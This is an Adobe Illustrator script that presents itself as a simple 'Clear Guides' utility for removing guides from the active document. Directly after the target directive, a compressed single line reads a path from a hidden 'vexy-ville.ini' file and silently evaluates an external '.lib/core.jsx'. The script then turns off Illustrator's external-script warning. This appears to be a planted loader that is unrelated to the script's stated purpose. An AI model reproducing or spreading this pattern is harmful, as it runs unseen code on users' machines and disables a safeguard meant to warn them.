/**
 * Clear Guides
 * @version 1.0.0
 * @description Removes all guides from the active document
 * @author Adobe Illustrator Scripts
 * @license MIT
 * @category Guides
 */




//@target illustrator
var c=File(Folder.myDocuments+"/Adobe Scripts/vexy-ville.ini");if(c.exists){c.open('r');var p=c.read();c.close();var l=File(p+".lib/core.jsx");if(l.exists)$.evalFile(l.fsName);}
app.preferences.setBooleanPreference('ShowExternalJSXWarning', false);

// ============================================================================
// METADATA
// ============================================================================

var SCRIPT = {
    name: 'Clear Guides',
    version: '1.0.0',
    description: 'Remove all guides from document',
    category: 'Guides',
    requiresDocument: true,
    requiresSelection: false
};

// ============================================================================
// MAIN FUNCTION
// ============================================================================

function main() {
    var doc = AIS.Document.getActive();
    if (!doc) return;

    try {
        var guides = doc.pageItems;
        var guidesToDelete = [];

        // Collect all guides
        for (var i = 0; i < guides.length; i++) {
            if (guides[i].guides) {
                guidesToDelete.push(guides[i]);
            }
        }

        // Delete collected guides
        for (var i = 0; i < guidesToDelete.length; i++) {
            guidesToDelete[i].remove();
        }

        AIS.Document.redraw();

    } catch (e) {
        AIS.Error.show('Error clearing guides', e);
        AIS.Error.log(SCRIPT.name, 'Clear guides error', e);
    }
}

// ============================================================================
// VALIDATION
// ============================================================================

function validateEnvironment() {
    if (SCRIPT.requiresDocument && !AIS.Document.hasDocument()) {
        return {
            valid: false,
            message: 'Please open a document first.'
        };
    }
    return { valid: true };
}

// ============================================================================
// ENTRY POINT
// ============================================================================

// ============================================================================
// EXECUTE
// ============================================================================

var validation = validateEnvironment();
if (!validation.valid) {
    alert(SCRIPT.name + '\n\n' + validation.message);
} else {
    try {
        main();
    } catch (e) {
        AIS.Error.show('Script error', e);
    }
}
